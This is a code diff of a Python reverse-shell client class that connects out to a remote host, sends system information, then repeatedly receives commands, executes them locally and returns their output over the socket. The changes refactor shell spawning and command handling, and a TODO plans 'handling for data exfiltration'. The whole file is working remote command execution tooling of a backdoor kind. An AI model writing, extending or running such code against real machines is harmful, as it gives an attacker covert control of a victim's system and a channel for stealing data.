@@ -1,4 +1,4 @@
-# todo: create handling for data exfiltration
+# TODO: create handling for data exfiltration
 from .nodeutils import (
     os,
     shutil,
@@ -14,49 +14,17 @@ from .nodeutils import (
 
 class Client(StreamSocket):
     """TCP socket client class for the command shell"""
-    def __init__(self, rhost: str, port: int, verb: bool, debug: bool):
-        super().__init__(rhost, port, verb, debug)
-        self.Shell = None
-
-    def spawn_shell(self, op_sys: str = os.name) -> subprocess.Popen:
-        """Spawn new command shell process to be used for code execution"""
-        if op_sys == "nt":
-            shell_exec = shutil.which("powershell")
-            if shell_exec is None:
-                shell_exec = shutil.which("cmd")
-        else:
-            shell_exec = shutil.which("bash")
-            if shell_exec is None:
-                shell_exec = shutil.which("sh")
-
-        environment = os.environ.copy()
-
-        # Popen expects [str] for non-shell calls
-        shell = subprocess.Popen(
-            [], shell=True,
-            executable=shell_exec,
-            env=environment,
-            cwd=str(Path.home()),
-            stdin=subprocess.PIPE,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            encoding="utf-8"
-        )
-
-        if self.Verbose:
-            utils.status(f"{shell_exec}")
-
-        self.Shell = shell
-        return self.Shell
+    def __init__(self, rhost: str, port: int, shell: str, verb: bool, debug: bool):
+        super().__init__(rhost, port, shell, verb, debug)
 
     def connect(self) -> None:
         """Initiate connection to remote server shell"""
-        #TODO: spawn process for shell instead running single commands
+        # TODO: spawn process for shell instead running single commands
+        # TODO: configure timeouts and blocking
 
         sock = socket.socket()
         #sock.settimeout(60)
-
-        executable = self.get_executable()
+        #executable = self.get_exec()
 
         try:
             sock.connect((self.Address, self.Port))
@@ -75,13 +43,17 @@ class Client(StreamSocket):
             self.send(sock, sysinfo)
 
             # TODO: add code to send working directory to server each iteration
+            # TODO: to achieve => send input right back, add condition in server logic
 
             while True:
-                # TODO: send colorama.ansi.clear_screen
+                # receive => command to execute
                 command = self.receive(sock).decode()
+                family = self.check_special(command)
 
-                if command.lower() not in ["exit", "quit"]:
-                    stdout, stderr = self.execute(command, executable)
+                if family != "exit":
+                    stdout, stderr = self.execute(command)
+
+                    # TODO: update displayed path after changed directory
 
                     if stdout != b"":
                         output = stdout
@@ -94,7 +66,6 @@ class Client(StreamSocket):
                         utils.status(bytes(output).decode(), level, command)
                     elif self.Verbose:
                         utils.status(f"stdin => [{command}]", level)
-                        #print(opts["color"] + opts["symbol"] + Style.RESET_ALL, end=" ")
 
                     # send => command output
                     self.send(sock, output)
@@ -106,11 +77,6 @@ class Client(StreamSocket):
         except Exception as exc:
             self.except_handler(exc)
         finally:
-            if self.Shell is not None:
-                if self.Verbose:
-                    utils.status(f"Killing shell process {self.Shell.pid}")
-                self.Shell.kill()
-
             try:
                 sock.shutdown(socket.SHUT_WR)
             except OSError:
